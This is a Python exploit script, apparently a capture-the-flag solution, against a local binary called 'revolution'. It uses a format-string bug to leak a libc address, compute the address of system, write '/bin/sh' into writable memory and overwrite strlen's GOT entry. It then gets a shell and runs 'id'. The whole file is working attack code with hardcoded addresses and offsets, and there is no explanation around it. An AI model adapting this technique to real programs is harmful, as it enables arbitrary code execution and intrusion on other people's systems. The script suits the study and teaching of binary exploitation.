#!/usr/bin/env python3
"""Local exploit for Print Print Revolution (uses the host's glibc)."""

import os
import struct
import subprocess
import sys


WRITE_GOT = 0x404000
STRLEN_GOT = 0x404008
COMMAND = 0x404070  # writable .bss
WRITE_OFFSET = 0x1071A0  # /usr/lib/x86_64-linux-gnu/libc.so.6
SYSTEM_OFFSET = 0x543F0
PROMPT = b"score> "


def p64(value):
    return struct.pack("<Q", value)


def recv_until(fd, marker):
    data = bytearray()
    while not data.endswith(marker):
        chunk = os.read(fd, 4096)
        if not chunk:
            raise EOFError(f"process exited after {bytes(data)!r}")
        data.extend(chunk)
    return bytes(data)


def payload(spec, arg8, arg9=0):
    # In render(), the first stack vararg is main()'s buffer at position 6.
    # Position 8 is buffer+16, and position 9 is buffer+24.
    assert len(spec) <= 15
    return spec.ljust(15, b"Z") + b"\0" + p64(arg8) + p64(arg9) + b"\n"


def main():
    process = subprocess.Popen(
        ["./revolution"], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT, bufsize=0,
    )
    to_child = process.stdin.fileno()
    from_child = process.stdout.fileno()
    recv_until(from_child, PROMPT)

    os.write(to_child, payload(b"%8$s", WRITE_GOT))
    reply = recv_until(from_child, PROMPT)
    leak = reply.split(b"Z" * 11, 1)[0]
    write_address = int.from_bytes(leak[:8].ljust(8, b"\0"), "little")
    assert write_address >> 40 == 0x7f, f"unexpected write leak: {leak!r}"
    libc_base = write_address - WRITE_OFFSET
    system_address = libc_base + SYSTEM_OFFSET
    print(f"write@libc = {write_address:#x}")
    print(f"libc base  = {libc_base:#x}")
    print(f"system     = {system_address:#x}")

    os.write(to_child, payload(b"%8$w", COMMAND, int.from_bytes(b"/bin/sh\0", "little")))
    recv_until(from_child, PROMPT)

    os.write(to_child, payload(b"%8$w", STRLEN_GOT, system_address))
    recv_until(from_child, PROMPT)

    # %s invokes the overwritten strlen@GOT with rdi = COMMAND.
    os.write(to_child, payload(b"!%8$s", COMMAND))
    # Synchronize: the renderer has consumed the trigger before we queue shell input.
    recv_until(from_child, b"!")
    os.write(to_child, b"echo LOCAL_SHELL_OK; id; exit\n")
    process.stdin.close()
    result = process.stdout.read()
    print(result.decode("latin-1", errors="replace"), end="")
    process.wait(timeout=3)
    if b"LOCAL_SHELL_OK" not in result:
        sys.exit("shell did not execute")


if __name__ == "__main__":
    main()
